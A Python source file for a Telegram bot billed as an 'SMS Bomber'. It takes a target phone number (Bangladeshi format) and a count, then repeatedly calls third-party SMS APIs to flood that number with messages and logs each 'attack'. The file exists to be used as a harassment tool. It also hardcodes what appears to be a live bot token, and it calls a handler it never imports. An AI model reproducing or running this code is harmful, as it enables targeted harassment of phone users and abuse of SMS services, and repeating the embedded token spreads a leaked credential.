from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)
import aiohttp
import asyncio
import logging
from datetime import datetime
import json

# Bot Configuration
BOT_TOKEN = "7619796671:AAFLnz5d1SSh1jhJakaoR7Ny9dXNWMT_0qA"
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# States for ConversationHandler
ASK_NUMBER, ASK_LIMIT, CONFIRM = range(3)
user_data = {}

# Dark Theme Welcome Message
WELCOME_MESSAGE = (
    "🔥 *SM - The Ultimate SMS Bomber* 🔥\n"
    "Unleash chaos with style! 💣\n"
    "Click *Bombing* to start the attack.\n"
    "⚠️ *Use responsibly.*"
)

# API Endpoints for SMS Bombing (Multiple APIs for Power)
API_ENDPOINTS = [
    "https://bomberdemofor2hrtcs.vercel.app/api/trialapi?phone={number}",
    "https://another-sms-api.example.com/send?phone={number}",  # Add more APIs here
]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start the bot with a dark-themed keyboard."""
    reply_keyboard = [["💣 Bombing"]]
    markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True)
    await update.message.reply_text(
        WELCOME_MESSAGE,
        parse_mode="Markdown",
        reply_markup=markup
    )
    return ASK_NUMBER

async def ask_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Validate the 'Bombing' button press."""
    if update.message.text != "💣 Bombing":
        await update.message.reply_text("🖤 Press *Bombing* to proceed!", parse_mode="Markdown")
        return ASK_NUMBER

    await update.message.reply_text(
        "📱 Enter target number (Format: 01XXXXXXXXX or 8801XXXXXXXXX):",
        parse_mode="Markdown"
    )
    return ASK_LIMIT

async def ask_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Validate phone number and ask for SMS limit."""
    number = update.message.text.strip()

    # Phone number validation
    if number.startswith("01") and len(number) == 11:
        number = "880" + number
    elif number.startswith("8801") and len(number) == 13:
        pass
    else:
        await update.message.reply_text(
            "❌ Invalid number! Use format: 01XXXXXXXXX or 8801XXXXXXXXX",
            parse_mode="Markdown"
        )
        return ASK_LIMIT

    user_data[update.effective_chat.id] = {"number": number}
    await update.message.reply_text(
        "💥 How many SMS blasts to send? (Max 100)",
        parse_mode="Markdown"
    )
    return CONFIRM

async def confirm_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Confirm the attack details and execute."""
    try:
        limit = int(update.message.text.strip())
        if limit < 1 or limit > 100:
            await update.message.reply_text(
                "⚠️ Enter a number between 1 and 100!",
                parse_mode="Markdown"
            )
            return CONFIRM
    except ValueError:
        await update.message.reply_text(
            "❌ Enter a valid number for the limit!",
            parse_mode="Markdown"
        )
        return CONFIRM

    chat_id = update.effective_chat.id
    number = user_data.get(chat_id, {}).get("number")

    if not number:
        await update.message.reply_text(
            "😵‍💫 Something broke! Restart with /start",
            parse_mode="Markdown"
        )
        return ConversationHandler.END

    # Confirmation keyboard
    confirm_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Confirm", callback_data="confirm")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
    ])
    await update.message.reply_text(
        f"🕸️ *Target*: {number}\n"
        f"💣 *SMS Count*: {limit}\n"
        f"Ready to unleash the storm?",
        parse_mode="Markdown",
        reply_markup=confirm_keyboard
    )
    user_data[chat_id]["limit"] = limit
    return ConversationHandler.END

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle confirmation/cancellation."""
    query = update.callback_query
    await query.answer()

    chat_id = query.message.chat_id
    number = user_data.get(chat_id, {}).get("number")
    limit = user_data.get(chat_id, {}).get("limit")

    if query.data == "cancel":
        await query.message.reply_text("🛑 Attack cancelled.", parse_mode="Markdown")
        user_data.pop(chat_id, None)
        return

    # Execute the attack
    await query.message.reply_text(
        f"💥 *Firing {limit} SMS to {number}...*",
        parse_mode="Markdown"
    )

    success, fail = 0, 0
    async with aiohttp.ClientSession() as session:
        for _ in range(limit):
            for api in API_ENDPOINTS:
                try:
                    async with session.get(api.format(number=number), timeout=5) as resp:
                        if resp.status == 200:
                            success += 1
                        else:
                            fail += 1
                        await asyncio.sleep(0.5)  # Rate limiting
                except Exception as e:
                    logger.error(f"API error: {e}")
                    fail += 1

    # Save attack log
    log_entry = {
        "timestamp": datetime.now().isoformat(),
        "number": number,
        "limit": limit,
        "success": success,
        "failed": fail
    }
    with open("attack_log.json", "a") as f:
        json.dump(log_entry, f)
        f.write("\n")

    await query.message.reply_text(
        f"🖤 *Attack Complete!*\n"
        f"✅ Success: {success}\n"
        f"❌ Failed: {fail}",
        parse_mode="Markdown"
    )
    user_data.pop(chat_id, None)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel the operation."""
    await update.message.reply_text("🛑 Operation cancelled.", parse_mode="Markdown")
    user_data.pop(update.effective_chat.id, None)
    return ConversationHandler.END

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors gracefully."""
    logger.error(f"Update {update} caused error {context.error}")
    if update and update.message:
        await update.message.reply_text(
            "😵‍💫 An error occurred! Try again with /start",
            parse_mode="Markdown"
        )

def main():
    """Run the bot."""
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_number)],
            ASK_LIMIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_limit)],
            CONFIRM: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_attack)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_error_handler(error_handler)

    app.run_polling()

if __name__ == "__main__":
    main()
